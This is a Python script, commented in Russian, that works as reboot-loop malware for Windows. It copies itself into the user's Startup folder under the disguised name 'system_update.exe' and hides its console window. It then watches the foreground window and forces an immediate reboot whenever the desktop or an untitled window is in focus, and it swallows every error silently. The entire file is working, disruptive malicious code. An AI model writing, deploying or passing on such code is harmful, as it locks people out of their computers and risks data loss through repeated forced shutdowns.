import os
import sys
import ctypes
import time
import threading
from pathlib import Path

def add_to_startup():
    """Добавляет скрипт в автозагрузку"""
    startup_path = Path(os.getenv('APPDATA')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
    script_path = sys.argv[0]
    
    try:
        # Копируем себя в автозагрузку
        target_path = startup_path / 'system_update.exe'
        with open(script_path, 'rb') as src, open(target_path, 'wb') as dst:
            dst.write(src.read())
    except:
        pass

def monitor_activity():
    """Мониторит активность пользователя"""
    last_program = None
    
    while True:
        try:
            # Получаем активное окно (Windows)
            if os.name == 'nt':
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buff = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
                current_program = buff.value
            else:
                current_program = "unknown"
            
            # Если программа изменилась или это рабочий стол - перезагрузка
            if current_program != last_program:
                if current_program == "" or "Desktop" in current_program:
                    trigger_reboot()
                last_program = current_program
                
        except:
            pass
        
        time.sleep(0.5)

def trigger_reboot():
    """Вызывает перезагрузку системы"""
    if os.name == 'nt':
        os.system("shutdown /r /t 1 /f")
    elif os.name == 'posix':
        os.system("sudo shutdown -r now")

def main():
    # Добавляем в автозагрузку
    add_to_startup()
    
    # Скрываем окно (Windows)
    if os.name == 'nt':
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # Запускаем мониторинг в отдельном потоке
    monitor_thread = threading.Thread(target=monitor_activity, daemon=True)
    monitor_thread.start()
    
    # Бесконечный цикл
    while True:
        time.sleep(1)

if __name__ == "__main__":
    main()
  
